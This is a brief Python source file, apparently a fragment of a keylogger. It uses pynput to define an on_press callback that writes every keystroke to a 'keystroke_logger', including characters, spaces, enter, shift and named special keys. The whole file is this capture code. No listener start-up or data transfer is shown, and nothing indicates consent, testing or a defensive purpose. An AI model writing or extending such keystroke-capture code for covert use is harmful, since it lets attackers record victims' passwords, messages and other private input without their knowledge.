from pynput import keyboard
from logger_setup import keystroke_logger

def on_press(key):
    try:
        keystroke_logger.info(key.char, extra={"end": ""})
    except AttributeError:
        if key == keyboard.Key.space:
            keystroke_logger.info(" ", extra={"end": ""})
        elif key == keyboard.Key.enter:
            keystroke_logger.info("   ", extra={"end": ""})
        elif key == keyboard.Key.shift:
            keystroke_logger.info("[shift] ", extra={"end": ""})
        else:
            keystroke_logger.info(f"[{key.name}] ", extra={"end": ""})
